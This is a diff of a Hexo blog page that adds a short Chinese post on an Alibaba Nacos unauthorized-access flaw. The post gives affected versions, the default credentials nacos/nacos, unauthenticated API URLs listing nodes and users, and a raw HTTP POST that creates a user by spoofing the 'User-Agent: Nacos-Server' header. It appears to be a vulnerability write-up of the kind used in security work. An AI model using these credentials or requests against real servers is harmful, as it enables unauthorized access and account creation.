@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Hexo</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="Hexo">
+  <title>Alibaba Nacos 未授权访问漏洞 | Hexo</title>
+  <meta name="keywords" content=" Hexo , Markdown ">
+  <meta name="description" content="Alibaba Nacos 未授权访问漏洞 | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="打算学习java代码审计，提高自己的知识技能门槛，所以总结了学习之路。 1.java基础：尚硅谷Java零基础入门教程https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1Kb411W75N?p&#x3D;453 基础弱就从p29 027开始看，开2倍速看，可以跳过复习章节，可以全程都用idea看的过程做好笔记一天学2小时大概一个月学完    流畅控制    数组    类    封装">
 <meta property="og:type" content="article">
@@ -58,7 +58,7 @@
 
 
 <body>
-<aside class="nav mobile">
+<aside class="nav">
     <div class="nav-left">
         <a href="/"
    class="avatar_target">
@@ -452,12 +452,73 @@
         </div>
     </div>
 </aside>
-<div id="post" class="index">
+<div id="post">
     <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
+        <article id="post-java代码审计-Alibaba Nacos 未授权访问漏洞" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Lucky"><span class="toc-text">Lucky</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%9C-%E4%B8%80%E4%B8%87%E4%B8%AA%E5%B0%8F%E6%97%B6%E5%AE%9A%E5%BE%8B-%E2%80%9D"><span class="toc-text">“ 一万个小时定律 ”</span></a></li></ol></li></ol>
+        <h1 class="article-title">Alibaba Nacos 未授权访问漏洞</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="红蓝攻防">红蓝攻防</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color5">Hexo</a>
+            
+            <a class="color4">Markdown</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2021-10-26 14:44:17'>2021-06-28 15:16</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>Count:165</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="跳转至评论区">
+            <a href="#comments">
+                Comment:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="toc-text">默认账号密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E6%96%B0%E5%BB%BA%E8%B4%A6%E5%8F%B7"><span class="toc-text">未授权新建账号</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -470,22 +531,45 @@
     }
 </style>
 </div>
-            <h1 id="Lucky"><a href="#Lucky" class="headerlink" title="Lucky"></a>Lucky</h1><h2 id="“-一万个小时定律-”"><a href="#“-一万个小时定律-”" class="headerlink" title="“ 一万个小时定律 ”"></a>“ 一万个小时定律 ”</h2><p>​                        人们眼中的天才之所以卓越非凡，并非天资超人一等，而是付出了持续不断的努力。</p>
-<p>​                                                            要成为某个领域的专家，需要 10000个小时。</p>
-<p>​                                                  按比例计算就是：如果每天工作 8 个小时，一周工作 5 天，</p>
-<p>​                                                               那么成为一个领域的专家至少需要 5 年，</p>
-<p>​                                                                             这就是一万小时定律。</p>
-<p>​                                                                           <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%80%E4%B8%87%E5%B0%8F%E6%97%B6%E5%AE%9A%E5%BE%8B">百度百科：一万小时定律</a></p>
-<p>到目前为止已经写了<code class="article_number"></code>篇文章， 共<code class="site_word_count"></code>字。</p>
-<p>本站访问人数：<code class="site_uv"></code>人次 ， 访问量：<code class="site_pv"></code>次<br><span id="sitetime"></span></p>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Nacos &lt;= 2.0.0-ALPHA.1</p>
+<h2 id="默认账号密码"><a href="#默认账号密码" class="headerlink" title="默认账号密码"></a>默认账号密码</h2><p>nacos/nacos</p>
+<h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p><a target="_blank" rel="noopener" href="http://127.0.0.1/nacos/v1/core/cluster/nodes?withInstances=false&amp;pageNo=1&amp;pageSize=10&amp;keyword=">http://127.0.0.1/nacos/v1/core/cluster/nodes?withInstances=false&amp;pageNo=1&amp;pageSize=10&amp;keyword=</a></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/nacos/v1/auth/users?pageNo=1&amp;pageSize=9">http://127.0.0.1/nacos/v1/auth/users?pageNo=1&amp;pageSize=9</a></p>
+<p><img src="https://img-blog.csdnimg.cn/20210125175924889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MjU3OTM2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="未授权新建账号"><a href="#未授权新建账号" class="headerlink" title="未授权新建账号"></a>未授权新建账号</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /nacos/v1/auth/users? HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 29</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">User-Agent: Nacos-Server</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Origin: http://127.0.0.1127.0.0.1</span><br><span class="line">Referer: http://127.0.0.1/nacos/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username=test1&amp;password=test1</span><br></pre></td></tr></table></figure>
 
-        </article>
-        
-        <p>
-            <a  class="dashang" onclick="dashangToggle()">赏</a>
-        </p>
-        
-        
+<p>注意：请求包需要加入User-Agent: Nacos-Server，否则有时候会返回403</p>
+<p><img src="https://img-blog.csdnimg.cn/20210125175959116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MjU3OTM2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>自动检测可以使用fscan或者goby</p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2017441810@qq.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">💰</a>
+</p>
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">Title:</span>Alibaba Nacos 未授权访问漏洞</p>
+    <p><span class="copy-title">Count:</span><span class="post-count">165</span></p>
+    <p><span class="copy-title">Author:</span><a  title="John Doe">John Doe</a></p>
+    <p><span class="copy-title">Created At:</span>2021-06-28, 15:16:12</p>
+    <p><span class="copy-title">Updated At:</span>2021-10-26, 14:44:17</p>
+    <span class="copy-title">Url:</span><a class="post-url" href="/2021/06/28/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Alibaba%20Nacos%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" title="Alibaba Nacos 未授权访问漏洞">http://example.com/2021/06/28/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Alibaba%20Nacos%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</a>
+    <p>
+        <span class="copy-title">Copyright:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">&#39;Attribution-non-commercial-shared in the same way 4.0&#39;</a> Reprint please keep the original link and author.
+    </p>
+</div>
+
+
+
     <div id="comments"></div>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
 
@@ -507,6 +591,13 @@
 </script>
 
 
+
+
+    
+
+
+
+
     </div>
     <div class="copyright">
         <p class="footer-entry">
@@ -515,11 +606,11 @@
 <p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
 
     </div>
-</div>
-<div class="full-toc">
-    <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
 <a class="" id="rocket" ></a>
 
+    </div>
 </div>
 
 <div class="hide_box" onclick="dashangToggle()"></div>
